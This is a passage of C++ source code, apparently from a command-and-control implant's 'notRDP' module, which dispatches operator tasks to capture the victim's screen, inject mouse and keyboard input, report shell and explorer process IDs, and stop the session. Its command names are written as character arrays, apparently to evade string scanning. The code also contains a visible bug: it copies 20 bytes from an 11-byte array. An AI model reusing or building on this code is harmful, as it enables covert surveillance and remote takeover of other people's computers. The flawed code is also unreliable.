      uint32_t v = state->explorer_pid;
      int di = 0;
      if (v == 0)
        digits[di++] = '0';
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      int bi = 21;
      for (int k = di - 1; k >= 0; k--)
        okbuf[bi++] = digits[k];
      const char shell_s[] = {' ', 's', 'h', 'e', 'l', 'l',
                              'p', 'i', 'd', '=', 0};
      memory::copy(okbuf + bi, (void *)shell_s, 20);
      bi += 9;
      v = state->shell_pid;
      di = 0;
      if (v == 0)
        digits[di++] = '0';
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      for (int k = di - 1; k >= 0; k--)
        okbuf[bi++] = digits[k];
      okbuf[bi] = 0;
      queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                     symbol<char *>(const_cast<char *>(okbuf)));
    }

    /* ── SHOT ── */
  } else {
    char shot_s[] = {'s', 'h', 'o', 't', 0};
    if (str_ncmp(action, shot_s, 4) == 0) {
      auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
      if (!state || !state->active) {
        queue_response(
            inst, task_uuid, RESPONSE_ERROR,
            symbol<char *>(const_cast<char *>("notRDP not started")));
        return;
      }
      nr_capture(inst, state, task_uuid);

      /* ── INPUT ── */
    } else {
      char input_s[] = {'i', 'n', 'p', 'u', 't', 0};
      if (str_ncmp(action, input_s, 5) == 0) {
        auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
        if (!state || !state->active) {
          queue_response(
              inst, task_uuid, RESPONSE_ERROR,
              symbol<char *>(const_cast<char *>("notRDP not started")));
          return;
        }
        int32_t x = static_cast<int32_t>(parser_int32(params));
        int32_t y = static_cast<int32_t>(parser_int32(params));
        int32_t act = static_cast<int32_t>(parser_int32(params));
        int32_t key = static_cast<int32_t>(parser_int32(params));
        nr_input(inst, state, x, y, act, key);
        queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                       symbol<char *>(const_cast<char *>("input sent")));

        /* ── STOP ── */
      } else {
        char stop_s[] = {'s', 't', 'o', 'p', 0};
        if (str_ncmp(action, stop_s, 4) == 0) {
          auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
          if (!state) {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("notRDP not running")));
            return;
          }
          nr_stop(inst, state);
          queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                         symbol<char *>(const_cast<char *>("notRDP stopped")));
        } else {
          queue_response(inst, task_uuid, RESPONSE_ERROR,
                         symbol<char *>(const_cast<char *>("unknown action")));
        }
      }
    }
  }
}

#endif /* INCLUDE_CMD_NOTRDP */
